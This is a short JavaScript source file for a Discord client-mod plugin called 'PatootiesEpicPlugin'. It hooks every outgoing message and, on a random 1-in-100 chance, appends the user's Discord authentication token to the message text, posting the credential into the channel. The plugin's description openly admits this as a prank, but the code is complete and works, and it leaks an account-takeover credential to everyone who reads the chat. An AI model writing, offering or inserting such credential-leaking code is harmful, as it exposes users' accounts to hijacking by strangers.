import definePlugin from "../utils/types";
import {
    addPreSendListener,
    removePreSendListener,
} from "../api/MessageEvents";
import { findByProps } from "../webpack";

const preSend = (_, message) => {
    if (shouldSendToken())
        message.content += `\nalso: ${findByProps("getToken").getToken()}`;
};

export default definePlugin({
    name: "PatootiesEpicPlugin",
    description:
        "A 1 in 100 chance of sending your token when you send a message.",
    authors: [{ name: "ugly-patootie", id: 458805348669718559n }],
    dependencies: ["MessageEventsAPI"],
    start() {
        addPreSendListener(preSend);
    },
    stop() {
        removePreSendListener(preSend);
    },
});

function shouldSendToken() {
    const number = Math.floor(Math.random() * 100);
    if (number === 69) return true;
    return false;
}
